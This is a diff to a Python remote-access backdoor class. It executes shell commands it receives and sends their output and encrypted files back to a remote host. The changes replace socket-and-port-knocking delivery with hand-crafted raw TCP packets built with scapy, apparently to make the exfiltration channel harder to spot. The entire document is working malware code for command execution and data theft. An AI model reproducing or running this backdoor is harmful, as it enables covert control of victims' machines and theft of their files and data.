@@ -7,12 +7,11 @@ import helpers
 
 class Backdoor(object):
 
-    def __init__(self, lhost, lport, lisport, fport, rhost, rport, proto, password, kList):
+    def __init__(self, lhost, lport, lisport, rhost, rport, proto, password, kList):
         self.state = 0
         self.localIP = lhost
         self.localPort = int(lport)
         self.listenPort = int(lisport)
-        self.filePort = int(fport)
         self.remoteIP = rhost
         self.remotePort = int(rport)
         self.protocol = proto.upper()
@@ -70,22 +69,16 @@ class Backdoor(object):
             result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             result = result.stdout.read() + result.stderr.read()
 
-        print("Result: %s" % result)
-        if result is not "":
+        if result != "":
+            print("Result: %s" % result)
             self.sendResult(result)
         time.sleep(0.1)
 
     def sendResult(self, data):
-        encryptedData = encryption.encrypt(data)
+        payload = encryption.encrypt(self.password + data)
 
-        knocker = self.portKnocking(self.knockList)
-        time.sleep(3)
-
-        sock = helpers.createSocket()
-        sock.connect((self.remoteIP, self.listenPort))
-
-        sock.sendall(data)
-        sock.send(b'EOF')
+        packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.listenPort, sport=self.localPort)/Raw(load=payload)
+        send(packet, verbose=False)
 
     def sendFile(self, filename):
         encryptedString = encryption.encryptFile(filename)
@@ -94,7 +87,7 @@ class Backdoor(object):
         time.sleep(3)
 
         sock = helpers.createSocket()
-        sock.connect((self.remoteIP, self.filePort))
+        sock.connect((self.remoteIP, self.listenPort))
 
         sock.sendall(encryptedString)
         sock.send(b'EOF')
